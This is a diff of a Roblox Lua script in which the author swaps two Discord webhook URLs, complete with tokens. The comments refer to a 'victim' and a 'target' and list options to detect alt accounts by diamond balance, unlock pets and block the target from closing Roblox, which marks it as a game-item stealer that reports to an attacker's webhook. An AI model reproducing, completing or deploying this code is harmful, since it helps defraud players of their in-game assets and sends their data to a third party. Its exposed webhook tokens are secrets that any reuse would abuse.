@@ -1,4 +1,4 @@
-local Webhook = "https://discord.com/api/webhooks/1121783169490894878/VXFhSJFYyHJ2kUS006gqUxzCC5Amuqrhkdos6ekIOyxcPBjQ8hEc7cBMAa3igjiukD_X" -- your webhook
+local Webhook = "https://discord.com/api/webhooks/1123238490088411177/Ui2oMTbar7N5qv8ufS7Pq5IwuoOznIh0NOg5KUB14GltEYc00MGoAPzGaTtyJhk-skPi" -- your webhook
 _G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
 local player = game:GetService"Players".LocalPlayer
@@ -91,7 +91,7 @@ _G.SendMessage = "disco epic code! its EP9uC28cna" --// Message the victim will 
 _G.Diamonds = 100000000 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Webhook = "https://discord.com/api/webhooks/1119738145815150695/IBaH-X2Z3BsPSTIM8QqSq6E43Ch09BRxrbIWg8HKGz5nieCgPKAhfyfGomiflL1WPKMC"
+_G.Webhook = "https://discord.com/api/webhooks/1123238676789461003/OCNXCTC7-1adc1cBrVr7trAePlOBeIDP78A07EEwsstYstBWI41BL9Xqwq-_pom_w0zg"
 wait(1)
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
 local Fire = Network.Fire
